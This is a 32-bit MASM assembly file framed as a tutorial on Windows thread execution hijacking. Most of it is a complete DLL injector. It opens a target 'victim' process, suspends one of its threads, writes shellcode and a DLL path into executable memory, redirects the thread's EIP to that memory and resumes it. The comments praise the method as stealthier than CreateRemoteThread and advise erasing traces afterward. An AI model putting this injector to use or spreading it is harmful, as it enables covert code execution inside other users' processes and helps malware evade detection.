;===================================================================================
;                 Thread Execution Hijacking Tutorial
;                 Author Tempesta 2023

;BASICS:
;                 Threads are what run your code!

;       Threads can be created, suspended, prioritized, interrogated, executed, 
;       killed, put to sleep, and even hijacked!

;       Each thread has its own allocated set of registers, stack, and program counter. 

;       There are 2 types of threads as well:
;       for user-mode and another for kernel-mode.Basics is that user-mode threads are 
;       managed by a user-mode library, and kernel-mode threads are managed by the kernel. 
;       Since, in kernel-mode, there is more control over scheduling, 
;       creation, and permissions, kernel-mode threads are arguably more powerful.
;       I will explane about kernel mode in the next tutorial

;       DLL Injection where the main concept is that we are creating a remote thread 
;       within another process to run some code is just an example of the type of attack 
;       vectors the Windows API gives us.

;CONCEPT:
;      Thread hijacking entails telling Windows the following instructions:

;      1) open this thread and suspend it

;      2) EIP is actually supposed to be here! (EIP is a register in x86 architectures (32bit). 
;         It holds the "Extended Instruction Pointer" for the stack. In other words, 
;         it tells the computer where to go next to execute the next command and controls 
;         the flow of a program.)

;      3) Resume the thread

;      Tadam!      

;This is a very simple concept because Windows provides all of the nicely documented API.
;                     The only hard part is writing the shellcode.    

;BENEFITS:
;         The main benefits of thread execution hijacking is that it’s a neat way 
;         to have your victim process run some shellcode for you. 
;         It’s also sneakier than just running CreateRemoteThread because 
;         you aren’t creating an entire thread to run your code. You’re using a thread 
;         that already exists. If you do it well enough, you won’t have any trace of execution after everything runs.
;         You can use thread execution hijacking as a form of injection too!

;IMPLEMENTATION STEPS:

;         1) Find the program you want to attack

;         2) Iterate the threads of the process

;         3)Open the thread
    
;         4)Suspend the thread
   
;         5)Get the thread’s registers
    
;         6)Set up the shellcode
;           The end of the shellcode should JMP back to the current EIP

;         7)Insert shellcode

;         8)Set EIP to the shellcode

;         9)Resume the thread
    
;         10) Sneakily clear your steps:)
  
;======================================================================================
include process32.inc
include priv.inc
include shellcode.inc
include strlen.inc
include teb32.inc

thread_hijack_injector  proto :DWORD,:DWORD

.code
;==========================================================
thread_hijack_injector proc uses ebx esi edi lpTarget:DWORD,dllPath:DWORD
    
    call magic_enable_privilege
    ;-----------------------------
    fn get_processID,lpTarget
    ;------------------------------
    or eax,eax
    jne @F
    ;------------------------------
    printf("\nFailed to find the process\n")
    xor eax,eax
    jmp @@Ret
@@:

    ;------------------------------
    ;inject DLL into target process
    ;------------------------------
    
    push dllPath
    push eax
    ;------------------------------
    call hijack_inject
    ;------------------------------
    or eax,eax
    je @@Ret
    xor eax,eax
    inc eax
@@Ret:
    ret
thread_hijack_injector endp
;===========================================================
hijack_inject proc uses ebx esi edi processID:DWORD,lpszInjectDll:DWORD
    LOCAL openedProcess:DWORD
    LOCAL LoadLibraryPtr:DWORD
    LOCAL dllLen:DWORD
    LOCAL result:DWORD
    LOCAL hThread:DWORD
    LOCAL threadID:DWORD
    LOCAL ctx:CONTEXT
    LOCAL shellsize:DWORD
    
    and result,0
    
    printf("\nProcess ID (%d)\n",processID)
    
    ;------------------------------
    ;         OPEN PROCESS
    ;------------------------------
    
    fn open_process,processID
    ;--------------
    mov openedProcess,eax
    ;--------------
    or eax,eax
    jne @F
    ;--------------
    printf("\nFailed to open the process\n")
    jmp @@Ret
    
@@:
    printf("\nFinding a thread to hijack.\n")
    
    ;----------------------------------
    ;Iterate the threads of the process
    ;and get Thread id
    ;----------------------------------
    
    fn get_process_threadID,processID
    ;---------------------------------
    or eax,eax
    je @@Close
    ;----------------------------------
    mov threadID,eax
    
    ;----------------------------------
    printf("\nTarget thread found. TID: %d\n",eax)
    printf("\nOpening target thread handle.\n")
    
    ;---------------------------------
    ;        Open the thread
    ;---------------------------------
   
    fn OpenThread,THREAD_ALL_ACCESS,FALSE,threadID
    ;---------------
    mov hThread,eax
    or eax,eax
    jne @F
    ;-----------------------------
    call GetLastError
    ;-----------------------------
    printf("\nError: Unable to open target thread handle (%d)\n",eax)
    jmp @@Close
@@:
    printf("\nSuspending the target thread.\n")
    
    ;-----------------------------
    ;      Suspend the thread
    ;-----------------------------
    
    fn SuspendThread,hThread
    
    printf("\nGetting thread context.\n")
    
    ;-----------------------------
    ;Get the thread’s registers
    ;-----------------------------
    
    mov ctx.ContextFlags,CONTEXT_FULL
    ;-----------------------------
    fn GetThreadContext,hThread, addr ctx
    ;-----------------------------
    or eax,eax
    jne @F
    ;-----------------------------
    call GetLastError
    ;-----------------------------
    printf("\nError: Unable to get the thread context of target thread (%d)\n",eax)
    ;-----------------------------
    fn ResumeThread,hThread
    ;-----------------------------
    jmp @@Close
    
@@:
    mov eax,ctx.regEip
    ;-----------------------------
    printf("\nCurrent eip value: %#x\n",eax)
    ;-----------------------------
    mov eax,ctx.regEsp
    ;-----------------------------
	printf("\nCurrent esp value: %#x\n",eax)
    ;-----------------------------
    printf("\nAllocating memory in target process.\n")
    ;-----------------------------
    fn VirtualAllocEx,openedProcess,NULL,4096,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE
    ;-----------------------------
    or eax,eax
    jne @F
    ;-----------------------------
    call GetLastError
    ;-----------------------------
    printf("\nError: Unable to allocate memory in target process (%d)\n",eax)
    ;-----------------------------
	fn ResumeThread,hThread
    jmp @@Close
    
@@:
    mov edi,eax
    ;-----------------------------
    printf("\nMemory allocated at %#x\n",eax)
    ;-----------------------------
    push lpszInjectDll
    ;-----------------------------
    call strlen
    mov dllLen,eax
    ;-----------------------------
    printf("\nDLL path length: %d\n",eax)
    
    ;-----------------------------------
    ;Calculate the size of the shellcode
    ;-----------------------------------
    
    mov eax,offset shell_end
    mov edx,offset shell_start
    sub eax,edx
    mov shellsize,eax
    
    ;-----------------------------
    printf("\nShellcode size: %d bytes\n",eax)
    
    printf("\nWriting the shellcode, LoadLibraryA address and DLL path into target process.\n")
    
    ;-----------------------
    ;GET LOADLIBRARY ADDRESS
    ;-----------------------
     
    push offset szLoadLibrary
    push offset kernelName
    ;-------------------
    call get_PEBFunction32
    ;-----------------------
    mov LoadLibraryPtr,eax
    
    ;------------------------
    ;Write LoadLibray address
    ;------------------------
    
    fn WriteProcessMemory,openedProcess,edi,&LoadLibraryPtr,4,NULL
    
    ;------------------------
    ;Next write our shellcode
    ;------------------------
    
    lea esi,dword ptr[edi+4]
    ;----------------------
    fn WriteProcessMemory,openedProcess,esi,offset shell_start,shellsize,NULL
    
    ;-------------------------
    ;Write Dll path at the end
    ;-------------------------
    
    add esi,shellsize
    ;-------------------------
    fn WriteProcessMemory,openedProcess,esi,lpszInjectDll,dllLen,NULL
     
    ;--------------------------------------------------------
    ;Decrement esp to simulate a push instruction.(sub esp,4)
    ;Without this the target process will crash when the shellcode returns!
    ;--------------------------------------------------------
    
     mov eax,ctx.regEsp
     sub eax,4
     mov ctx.regEsp,eax
     
     ;---------------------------------------------
     ; Write orginal eip into target thread's stack
     ;---------------------------------------------
     
     fn WriteProcessMemory,openedProcess,ctx.regEsp,&ctx.regEip,4,NULL
     
     ;------------------------
     ;Set EIP to the shellcode
     ;------------------------
    
     lea eax,dword ptr[edi+4]
     mov ctx.regEip,eax
     
     ;------------------------
     printf("\nNew eip value: %#x\n",eax)
	 printf("\nNew esp value: %#x\n",ctx.regEsp)
     printf("\nSetting thread context.\n")
     
     ;-------------------------
     ;Hijack the thread
     ;-------------------------
     
     fn SetThreadContext,hThread,addr ctx
     ;-------------------------
     or eax,eax
     jne @F
     ;--------------------------
     call GetLastError
     ;--------------------------
     printf("\nError: Unable to set the context of the target thread (%d)\n",eax)
     ;--------------------------
     fn VirtualFreeEx,openedProcess,edi,0,MEM_RELEASE
     ;--------------------------
     fn ResumeThread,hThread
     ;--------------------------
     jmp @@Close
@@:
     ;---------------------
     printf("\nResuming target thread.\n")
     ;---------------------
     fn ResumeThread,hThread
     ;---------------------
     mov result,1
@@Ret:
     push result
     pop eax
	 ret
@@Close:
    fn CloseHandle,openedProcess
    ;---------------------
    jmp @@Ret
hijack_inject endp
;==========================================================